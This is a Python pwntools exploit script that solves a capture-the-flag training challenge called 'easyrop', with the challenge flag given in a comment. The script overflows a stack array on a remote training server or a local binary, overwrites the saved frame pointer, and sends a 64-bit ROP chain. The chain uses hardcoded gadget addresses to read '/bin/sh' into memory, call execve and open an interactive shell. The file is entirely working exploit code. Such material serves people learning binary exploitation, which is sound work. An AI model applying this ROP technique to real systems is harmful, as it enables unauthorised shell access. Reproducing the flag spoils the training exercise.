#!/usr/bin/env python3

# flag{64bit_rop_it_is_even_easier_than_32!}

import sys
from pwn import *
from pwn import p32

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2015)
else:
    p = process("./easyrop")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x400291
    c
    """)


def send_number(p, n):
    p.send(p32(n))
    p.send(p32(0))
    return p.recvn(4)


def send_address(p, n):
    send_number(p, n)
    send_number(p, 0)


def exit_loop(p):
    p.send(b'\x04')
    p.send(b'\x04')
    p.recvn(4)


def do_syscall(p):
    # syscall; nop; pop rbp; ret;
    syscall_gadget = 0x4001b3
    send_address(p, syscall_gadget)
    send_address(p, 0)


def do_read(p, buffer_address):
    gadget(p)
    send_address(p, 0)  # rdi
    send_address(p,  buffer_address)  # rsi
    send_address(p, 0xff)  # rdx
    send_address(p, 0)  # rax
    do_syscall(p)


def do_execve(p, buffer_address):
    gadget(p)
    send_address(p, buffer_address)  # rdi
    send_address(p,  0)  # rsi
    send_address(p, 0)  # rdx
    send_address(p, 0x3b)  # rax
    do_syscall(p)


def gadget(p):
    # gadget code:
    # pop    rdi
    # pop    rsi
    # pop    rdx
    # pop    rax
    # ret
    params_gadget = 0x4001c2
    send_address(p, params_gadget)


p.recvuntil(b"Try easyROP!\n")

# fill the array
for i in range(12):
    send_number(p, 1)

# overwrite sRBP
send_address(p, 1)

# overwrite from sRIP with the rop chain
buffer_address = 0x600370
do_read(p, buffer_address)
do_execve(p, buffer_address)
exit_loop(p)

p.sendline(b"/bin/sh\0")
p.interactive()
